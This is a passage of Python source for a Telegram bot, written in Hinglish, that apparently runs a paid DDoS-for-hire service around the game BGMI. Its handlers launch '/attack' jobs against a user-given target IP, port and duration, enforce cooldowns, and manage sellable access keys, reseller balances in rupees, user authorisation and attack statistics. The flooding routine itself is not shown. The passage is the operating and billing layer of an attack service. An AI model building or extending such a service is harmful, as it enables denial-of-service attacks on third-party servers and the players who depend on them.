        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return

    if chat_type == 'group' and not is_overlord(user_id, username) and not has_valid_feedback(user_id, chat_type):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ FEEDBACK REQUIRED ⚡️*\n\n"
            f"*STATUS*: Pehle BGMI ka screenshot bhej, bhai! 📸\n"
            f"*COSMIC INSIGHT*: Feedback ke bina group mein attack nahi chalega! 🚫\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/attack", f"Command: {command}", response)
        return

    if user_id in last_attack_time:
        elapsed = (datetime.datetime.now(IST) - last_attack_time[user_id]).total_seconds()
        if elapsed < COOLDOWN_PERIOD:
            remaining = int(COOLDOWN_PERIOD - elapsed)
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ COOLDOWN ACTIVE ⚡️*\n\n"
                f"*STATUS*: Thoda ruk, bhai! ⏳\n"
                f"*Remaining*: {remaining} seconds\n\n"
                f"*COSMIC COMMAND*: Thodi der baad try kar! 🚀\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/attack", f"Command: {command}", response)
            return

    threading.Thread(target=execute_attack, args=(target, port, time_duration, message.chat.id, username, last_attack_time, user_id, chat_type)).start()

@bot.message_handler(commands=['stats'])
def stats_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["stats"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_overlord(user_id, username):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ACCESS DENIED ⚡️*\n\n"
            f"*STATUS*: Bhai, ye sirf Overlord ka kaam hai! 🚫\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 se baat kar! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/stats", f"Command: {command}", response)
        return

    active_users = update_active_users()
    active_keys = len([key for key, info in keys.items() if not info.get("blocked", False) and (datetime.datetime.now(IST) - datetime.datetime.strptime(info["generated_time"], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)).total_seconds() < sum(parse_duration(info["duration"])[:3]) * 60])
    command_usage_str = "\n".join([f"📜 */{cmd}*: __{count}__" for cmd, count in stats["command_usage"].items()])
    memory_usage = len(keys) * 0.1 + len(users) * 0.05 + len(resellers) * 0.02  # Simulated memory usage in MB
    response = (
        f"~~~ NEON GATEWAY ~~~ 🌌\n"
        f"*⚡️ COSMIC LIVE STATS (OVERLORD) ⚡️*\n"
        f"*🔥 Bhai Overlord, yeh hai live report card! 🔥*\n\n"
        f"*VAULT STATUS:*\n"
        f"🔑 *Total Keys*: __{stats['total_keys']}__\n"
        f"🔑 *Active Keys*: __{active_keys}__\n"
        f"🔓 *Redeemed Keys*: __{stats['redeemed_keys']}__\n"
        f"❌ *Expired Keys*: __{stats['expired_keys']}__\n"
        f"🔑 *Keys/min*: __{calculate_keys_per_minute()}__\n\n"
        f"*ATTACK STATUS:*\n"
        f"💥 *Active Attacks*: __{stats['active_attacks']}__\n"
        f"💥 *Total Attacks*: __{stats['total_attacks']}__\n"
        f"⏱️ *Avg Attack Duration*: __{calculate_avg_attack_duration()}__\n\n"
        f"*USER STATUS:*\n"
        f"👥 *Total Users*: __{len(stats['total_users'])}__\n"
        f"👤 *Active Users (Last 5 min)*: __{active_users}__\n"
        f"👥 *Peak Active Users*: __{stats['peak_active_users']}__\n\n"
        f"*SYSTEM STATUS:*\n"
        f"⏳ *Bot Uptime*: __{calculate_uptime()}__\n"
        f"⚙️ *Memory Usage (Simulated)*: __{memory_usage:.2f}MB__\n\n"
        f"*COMMAND USAGE:*\n{command_usage_str}\n\n"
        f"*📅 Last Updated*: __{datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')}__\n"
        f"```nebula> overlord_stats\nstatus: RUNNING 🚀```\n"
        f"*⚡️ Cosmic power unleashed, bhai! ⚡️*\n"
        f"~~~ NEON EXIT ~~~"
    )
    try:
        sent_message = bot.send_message(message.chat.id, formatting.escape_markdown(append_compulsory_message(response)), parse_mode="MarkdownV2")
        threading.Thread(target=live_stats_update, args=(message.chat.id, sent_message.message_id)).start()
    except Exception as e:
        log_error(f"Stats send error: {str(e)}", user_id, username)
        safe_reply(bot, message, response)
    log_action(user_id, username, "/stats", "", response)

@bot.message_handler(commands=['logs'])
def logs_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["logs"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_overlord(user_id, username):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ACCESS DENIED ⚡️*\n\n"
            f"*STATUS*: Bhai, ye sirf Overlord ka kaam hai! 🚫\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 se baat kar! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/logs", f"Command: {command}", response)
        return

    try:
        with open(LOG_FILE, 'r', encoding='utf-8') as file:
            logs = file.readlines()
        recent_logs = logs[-100:]  # Last 100 lines
        log_content = ''.join(recent_logs)
        if not log_content.strip():
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ NO LOGS ⚡️*\n\n"
                f"*STATUS*: Koi logs nahi mile, bhai! 😢\n\n"
                f"*COSMIC COMMAND*: Thodi der baad try kar! 🚀\n"
                f"~~~ NEON EXIT ~~~"
            )
        else:
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ RECENT LOGS ⚡️*\n\n"
                f"*STATUS*: Yeh hai latest logs, bhai!\n\n"
                f"```log\n{log_content}\n```\n"
                f"*COSMIC INSIGHT*: Log check karke system ko samajh! 💥\n"
                f"~~~ NEON EXIT ~~~"
            )
    except Exception as e:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ SYSTEM ERROR ⚡️*\n\n"
            f"*STATUS*: Logs nahi mil paye! 😢\n"
            f"*Error*: {str(e)}\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 ko bol, issue fix karenge! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/logs", "", response)

@bot.message_handler(commands=['users'])
def users_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["users"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ACCESS DENIED ⚡️*\n\n"
            f"*STATUS*: Bhai, ye sirf admin ka kaam hai! 🚫\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 se baat kar! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/users", f"Command: {command}", response)
        return

    if not users:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ NO USERS ⚡️*\n\n"
            f"*STATUS*: Koi authorized users nahi hai, bhai! 😢\n\n"
            f"*COSMIC COMMAND*: /add <user_id> use kar users add karne ke liye! 🚀\n"
            f"~~~ NEON EXIT ~~~"
        )
    else:
        user_list = []
        for uid, info in users.items():
            try:
                exp_date = datetime.datetime.strptime(info['expiration'], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                user_list.append(f"👤 *User ID*: {uid}\n⏳ *Expires*: {exp_date.strftime('%Y-%m-%d %I:%M:%S %p')}\n🌐 *Context*: {info['context'].capitalize()}\n")
            except (ValueError, KeyError):
                user_list.append(f"👤 *User ID*: {uid}\n⏳ *Expires*: Invalid Data\n🌐 *Context*: Unknown\n")
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ AUTHORIZED USERS ⚡️*\n\n"
            f"*STATUS*: Yeh hai active users ki list, bhai!\n\n"
            + "\n".join(user_list) +
            f"\n*COSMIC INSIGHT*: In users ke paas cosmic power hai! 💥\n"
            f"*COSMIC COMMAND*: /add ya /remove use kar list manage karne ke liye! 🚀\n"
            f"~~~ NEON EXIT ~~~"
        )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/users", "", response)

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["add"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ACCESS DENIED ⚡️*\n\n"
            f"*STATUS*: Bhai, ye sirf admin ka kaam hai! 🚫\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 se baat kar! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Sahi format mein daal, bhai!\n"
            f"*Usage*: /add <user_id>\n"
            f"*Example*: /add 123456789 📋\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return

    target_id = command_parts[1]
    try:
        target_id = str(int(target_id))
    except ValueError:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: User ID number hona chahiye! ❌\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Command: {command}", response)
        return

    if target_id in authorized_users:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ALREADY AUTHORIZED ⚡️*\n\n"
            f"*STATUS*: User {target_id} pehle se authorized hai! ✅\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/add", f"Target: {target_id}", response)
        return

    expiration_time = add_time_to_current_date(days=30)  # Default 30-day access
    authorized_users[target_id] = {
        "expiration": expiration_time.strftime('%Y-%m-%d %I:%M:%S %p'),
        "context": "group"
    }
    save_data()
    response = (
        f"~~~ NEON GATEWAY ~~~ 🌌\n"
        f"*⚡️ USER ADDED ⚡️*\n\n"
        f"*STATUS*: User add ho gaya! 🎉\n"
        f"👤 *User ID*: {target_id}\n"
        f"⏳ *Expires on*: {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
        f"🌐 *Context*: Group\n\n"
        f"*COSMIC COMMAND*: /users dekh list! ✅\n"
        f"~~~ NEON EXIT ~~~"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/add", f"Target: {target_id}", response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["remove"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ACCESS DENIED ⚡️*\n\n"
            f"*STATUS*: Bhai, ye sirf admin ka kaam hai! 🚫\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 se baat kar! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Sahi format mein daal, bhai!\n"
            f"*Usage*: /remove <user_id>\n"
            f"*Example*: /remove 123456789 📋\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Command: {command}", response)
        return

    target_id = command_parts[1]
    try:
        target_id = str(int(target_id))
    except ValueError:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: User ID number hona chahiye! ❌\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Command: {command}", response)
        return

    if target_id not in users and target_id not in authorized_users:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ NOT AUTHORIZED ⚡️*\n\n"
            f"*STATUS*: User {target_id} authorized nahi hai! ❌\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/remove", f"Target: {target_id}", response)
        return

    if target_id in users:
        del users[target_id]
    if target_id in authorized_users:
        del authorized_users[target_id]
    save_data()
    response = (
        f"~~~ NEON GATEWAY ~~~ 🌌\n"
        f"*⚡️ USER REMOVED ⚡️*\n\n"
        f"*STATUS*: User remove ho gaya! 🗑️\n"
        f"👤 *User ID*: {target_id}\n\n"
        f"*COSMIC COMMAND*: /users dekh list! ✅\n"
        f"~~~ NEON EXIT ~~~"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/remove", f"Target: {target_id}", response)

@bot.message_handler(commands=['resellers'])
def resellers_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["resellers"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not resellers:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ NO RESELLERS ⚡️*\n\n"
            f"*STATUS*: Koi resellers nahi hai, bhai! 😢\n\n"
            f"*COSMIC COMMAND*: /addreseller use kar reseller add karne ke liye! 🚀\n"
            f"~~~ NEON EXIT ~~~"
        )
    else:
        reseller_list = []
        for rid, balance in resellers.items():
            reseller_list.append(f"👤 *Reseller ID*: {rid}\n💰 *Balance*: {balance} Rs\n")
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ RESELLERS LIST ⚡️*\n\n"
            f"*STATUS*: Yeh hai active resellers ki list, bhai!\n\n"
            + "\n".join(reseller_list) +
            f"\n*COSMIC INSIGHT*: Yeh log keys bech ke cosmic power distribute karte hai! 💥\n"
            f"*COSMIC COMMAND*: /addreseller ya /removereseller use kar! 🚀\n"
            f"~~~ NEON EXIT ~~~"
        )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/resellers", "", response)

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["addbalance"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ACCESS DENIED ⚡️*\n\n"
            f"*STATUS*: Bhai, ye sirf admin ka kaam hai! 🚫\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 se baat kar! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 3:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Sahi format mein daal, bhai!\n"
            f"*Usage*: /addbalance <reseller_id> <amount>\n"
            f"*Example*: /addbalance 123456789 1000 📋\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Command: {command}", response)
        return

    reseller_id = command_parts[1]
    try:
        amount = int(command_parts[2])
        if amount < 0:
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ COMMAND ERROR ⚡️*\n\n"
                f"*STATUS*: Amount negative nahi ho sakta! ❌\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/addbalance", f"Command: {command}", response)
            return
    except ValueError:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Amount number hona chahiye! ❌\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Command: {command}", response)
        return

    if reseller_id not in resellers:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ NOT A RESELLER ⚡️*\n\n"
            f"*STATUS*: {reseller_id} reseller nahi hai! ❌\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/addbalance", f"Reseller ID: {reseller_id}", response)
        return

    resellers[reseller_id] += amount
    save_data()
    response = (
        f"~~~ NEON GATEWAY ~~~ 🌌\n"
        f"*⚡️ BALANCE ADDED ⚡️*\n\n"
        f"*STATUS*: Balance update ho gaya! 🎉\n"
        f"👤 *Reseller ID*: {reseller_id}\n"
        f"💰 *Added Amount*: {amount} Rs\n"
        f"💰 *New Balance*: {resellers[reseller_id]} Rs\n\n"
        f"*COSMIC COMMAND*: /resellers dekh list! ✅\n"
        f"~~~ NEON EXIT ~~~"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/addbalance", f"Reseller ID: {reseller_id}, Amount: {amount}", response)

@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["removereseller"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ACCESS DENIED ⚡️*\n\n"
            f"*STATUS*: Bhai, ye sirf admin ka kaam hai! 🚫\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 se baat kar! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Sahi format mein daal, bhai!\n"
            f"*Usage*: /removereseller <reseller_id>\n"
            f"*Example*: /removereseller 123456789 📋\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Command: {command}", response)
        return

    reseller_id = command_parts[1]
    if reseller_id not in resellers:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ NOT A RESELLER ⚡️*\n\n"
            f"*STATUS*: {reseller_id} reseller nahi hai! ❌\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/removereseller", f"Reseller ID: {reseller_id}", response)
        return

    del resellers[reseller_id]
    save_data()
    response = (
        f"~~~ NEON GATEWAY ~~~ 🌌\n"
        f"*⚡️ RESELLER REMOVED ⚡️*\n\n"
        f"*STATUS*: Reseller remove ho gaya! 🗑️\n"
        f"👤 *Reseller ID*: {reseller_id}\n\n"
        f"*COSMIC COMMAND*: /resellers dekh list! ✅\n"
        f"~~~ NEON EXIT ~~~"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/removereseller", f"Reseller ID: {reseller_id}", response)

@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["block"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ACCESS DENIED ⚡️*\n\n"
            f"*STATUS*: Bhai, ye sirf admin ka kaam hai! 🚫\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 se baat kar! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Sahi format mein daal, bhai!\n"
            f"*Usage*: /block <key_name>\n"
            f"*Example*: /block Rahul_sadiq-rahul 📋\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Command: {command}", response)
        return

    key = command_parts[1].strip()
    if key not in keys:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ INVALID KEY ⚡️*\n\n"
            f"*STATUS*: Yeh key exist nahi karta! ❌\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Key: {key}", response)
        return

    if keys[key].get("blocked", False):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ALREADY BLOCKED ⚡️*\n\n"
            f"*STATUS*: Yeh key pehle se block hai! 🚫\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/block", f"Key: {key}", response)
        return

    keys[key]["blocked"] = True
    keys[key]["blocked_by_username"] = username or f"UserID_{user_id}"
    keys[key]["blocked_time"] = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
    for device_id in keys[key]["devices"]:
        if device_id in users:
            del users[device_id]
    save_data()
    response = (
        f"~~~ NEON GATEWAY ~~~ 🌌\n"
        f"*⚡️ KEY BLOCKED ⚡️*\n\n"
        f"*STATUS*: Key block ho gaya aur users hata diye! 🚫\n"
        f"🔑 *Key*: {key}\n"
        f"👤 *Blocked by*: @{keys[key]['blocked_by_username']}\n"
        f"📅 *Blocked on*: {keys[key]['blocked_time']}\n\n"
        f"*COSMIC COMMAND*: /listkeys dekh list! ✅\n"
        f"~~~ NEON EXIT ~~~"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/block", f"Key: {key}", response)

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["setcooldown"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ACCESS DENIED ⚡️*\n\n"
            f"*STATUS*: Bhai, ye sirf admin ka kaam hai! 🚫\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 se baat kar! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
        return

    command_parts = message.text.split()
    if len(command_parts) != 2:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Sahi format mein daal, bhai!\n"
            f"*Usage*: /setcooldown <seconds>\n"
            f"*Example*: /setcooldown 60 📋\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
        return

    try:
        seconds = int(command_parts[1])
        if seconds < 0:
            response = (
                f"~~~ NEON GATEWAY ~~~ 🌌\n"
                f"*⚡️ COMMAND ERROR ⚡️*\n\n"
                f"*STATUS*: Cooldown negative nahi ho sakta! ❌\n"
                f"~~~ NEON EXIT ~~~"
            )
            safe_reply(bot, message, response)
            log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
            return
    except ValueError:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ COMMAND ERROR ⚡️*\n\n"
            f"*STATUS*: Seconds number hona chahiye! ❌\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/setcooldown", f"Command: {command}", response)
        return

    set_cooldown(seconds)
    response = (
        f"~~~ NEON GATEWAY ~~~ 🌌\n"
        f"*⚡️ COOLDOWN SET ⚡️*\n\n"
        f"*STATUS*: Attack cooldown set ho gaya! 🎉\n"
        f"⏳ *Cooldown*: {seconds} seconds\n\n"
        f"*COSMIC COMMAND*: /checkcooldown dekh status! ✅\n"
        f"~~~ NEON EXIT ~~~"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/setcooldown", f"Cooldown: {seconds}", response)

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["checkcooldown"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    response = (
        f"~~~ NEON GATEWAY ~~~ 🌌\n"
        f"*⚡️ COOLDOWN STATUS ⚡️*\n\n"
        f"*STATUS*: Yeh hai current cooldown, bhai!\n"
        f"⏳ *Cooldown*: {COOLDOWN_PERIOD} seconds\n\n"
        f"*COSMIC INSIGHT*: Attack ke baad itna wait karna padega! ⏳\n"
        f"*COSMIC COMMAND*: /setcooldown use kar change karne ke liye! 🚀\n"
        f"~~~ NEON EXIT ~~~"
    )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/checkcooldown", "", response)

@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["listkeys"] += 1
    stats["total_users"].add(user_id)
    stats["active_users"].append({"user_id": user_id, "last_active": datetime.datetime.now(IST)})
    active_users_count = update_active_users()
    stats["peak_active_users"] = max(stats["peak_active_users"], active_users_count)
    command = message.text

    if not is_admin(user_id, username):
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ ACCESS DENIED ⚡️*\n\n"
            f"*STATUS*: Bhai, ye sirf admin ka kaam hai! 🚫\n\n"
            f"*COSMIC COMMAND*: @Rahul_618 se baat kar! 📩\n"
            f"~~~ NEON EXIT ~~~"
        )
        safe_reply(bot, message, response)
        log_action(user_id, username, "/listkeys", f"Command: {command}", response)
        return

    if not keys:
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ NO KEYS ⚡️*\n\n"
            f"*STATUS*: Koi keys nahi hai, bhai! 😢\n\n"
            f"*COSMIC COMMAND*: /genkey use kar keys banane ke liye! 🔑\n"
            f"~~~ NEON EXIT ~~~"
        )
    else:
        key_list = []
        for key, info in keys.items():
            device_limit = "Unlimited" if info["device_limit"] == float('inf') else info["device_limit"]
            blocked_status = "Blocked" if info.get("blocked", False) else "Active"
            blocked_info = f"\n🚫 *Blocked by*: @{info['blocked_by_username']}\n📅 *Blocked on*: {info['blocked_time']}" if info.get("blocked", False) else ""
            key_list.append(
                f"🔑 *Key*: {key}\n"
                f"⏳ *Duration*: {info['duration']}\n"
                f"📱 *Device Limit*: {device_limit}\n"
                f"📱 *Devices*: {len(info['devices'])}\n"
                f"🌐 *Context*: {info['context'].capitalize()}\n"
                f"👤 *Generated by*: @{info['generated_by']}\n"
                f"📅 *Generated on*: {info['generated_time']}\n"
                f"⚡️ *Status*: {blocked_status}{blocked_info}\n"
            )
        response = (
            f"~~~ NEON GATEWAY ~~~ 🌌\n"
            f"*⚡️ KEY VAULT ⚡️*\n\n"
            f"*STATUS*: Yeh hai sari keys ki list, bhai!\n\n"
            + "\n".join(key_list) +
            f"\n*COSMIC INSIGHT*: Yeh keys cosmic power ka darwaza hai! 💥\n"
            f"*COSMIC COMMAND*: /genkey ya /block use kar! 🔑\n"
            f"~~~ NEON EXIT ~~~"
        )
    safe_reply(bot, message, response)
    log_action(user_id, username, "/listkeys", "", response)

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    stats["command_usage"]["myinfo"] += 1
